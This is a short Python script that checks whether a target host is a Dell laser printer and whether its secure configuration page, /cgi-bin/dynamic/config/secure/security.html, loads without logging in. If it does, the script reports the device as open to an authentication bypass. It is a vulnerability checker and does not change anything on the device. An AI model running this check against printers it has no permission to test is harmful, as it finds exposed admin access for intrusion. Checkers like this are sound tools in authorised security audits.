#Author: Farish
#!/usr/bin/env python3
import requests
import sys
from urllib.parse import urlparse, urljoin
import re

if len(sys.argv) != 2:
    print(f"Usage: python3 {sys.argv[0]} <target_ip_or_url>")
    sys.exit(1)

input_url = sys.argv[1]
parsed = urlparse(input_url)
if parsed.scheme not in ['http', 'https']:
    base_url = 'http://' + input_url  # default to http
else:
    base_url = input_url

try:
    # Check main page
    resp = requests.get(base_url, timeout=12)
    if resp.status_code == 200 and "<TITLE>Dell" in resp.text and "Laser Printer</TITLE>" in resp.text:
        print(f"[+] Dell Laser Printer detected at {base_url}")

        # Extract printer version
        match = re.search(r'Dell([ 0-9A-Za-z]+).*Laser Printer', resp.text)
        if match:
            print(f"    Printer version: {match.group(1).strip()}")

        # Check security page (authentication bypass)
        sec_url = urljoin(base_url, "/cgi-bin/dynamic/config/secure/security.html")
        sec_resp = requests.get(sec_url, timeout=5)
        if sec_resp.status_code == 200 and "Security" in sec_resp.text:
            print(f"    [+] Application is vulnerable for authentication bypass!")
        else:
            print(f"[-] {base_url} does not appear to be vulnerable.")
    else:
        print(f"[-] {base_url} does not appear to be vulnerable.")


except requests.exceptions.ConnectionError:
    print(f"[!] Could not connect to {base_url}. Host may be down or unreachable.")
